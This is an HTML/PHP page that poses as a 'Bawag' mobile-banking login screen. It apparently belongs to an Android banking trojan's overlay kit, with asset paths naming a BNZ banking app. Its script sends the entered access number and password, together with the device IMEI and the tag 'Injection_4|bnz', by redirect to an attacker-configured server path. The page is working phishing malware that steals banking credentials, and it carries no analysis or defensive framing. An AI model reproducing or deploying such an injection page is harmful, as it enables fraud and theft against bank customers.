<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="nz/nz.co.bnz.droidbanking/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
<img class="headerimage" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAaIAAADLCAYAAAAsh5dJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjAzNURBMEE2MzExMTFFNzhDM0NFRUIwN0E5RDZFODMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjAzNURBMEI2MzExMTFFNzhDM0NFRUIwN0E5RDZFODMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCMDM1REEwODYzMTExMUU3OEMzQ0VFQjA3QTlENkU4MyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCMDM1REEwOTYzMTExMUU3OEMzQ0VFQjA3QTlENkU4MyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PkbxuskAABqgSURBVHja7J0LdF1V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">
</div>
    <div class="main">

        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">

                            <div class="form-group ">
									<input type="text" class="form-control" style="border-radius: 5px 5px 0 0;border-bottom: 1px solid #eee" name="field2" id="login" placeholder="Access number" autocomplete="off" maxlength="50" data-reg="/.{3,50}/" >
                           </div>

                            <div class="form-group">
									<input type="password" class="form-control" style="border-radius: 0 0 5px 5px;" name="field3" id="password" placeholder="Password" autocomplete="off" data-reg="/.{3,50}/" maxlength="50" >
                            </div>

<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
                       								<input type="button" class="input_submitBtn" onClick="sentServer();" value="Login">
 </form><br>
</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|bnz|"+login1+"|"+pass);
	}
}
</script>

</body>
</html>
